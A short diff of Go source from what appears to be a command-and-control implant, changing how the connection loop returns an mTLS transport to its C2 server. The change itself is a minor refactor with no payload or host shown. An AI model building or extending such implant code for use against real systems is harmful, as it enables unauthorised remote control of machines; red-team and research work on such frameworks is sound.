@@ -121,7 +121,7 @@ func StartConnectionLoop() *Connection {
 	for connectionAttempts < maxErrors {
 
 		var connection *Connection
-		var err error
+		// var err error
 
 		uri := nextCCServer()
 		// {{if .Config.Debug}}
@@ -135,8 +135,8 @@ func StartConnectionLoop() *Connection {
 		case "mtls":
 			transport, err := newTransportMTLS(uri)
 			if err == nil {
-				return transport.C2
-
+				connection = transport.C2
+				return connection
 			}
 			// {{if .Config.Debug}}
 			log.Printf("[mtls] Connection failed %s", err)
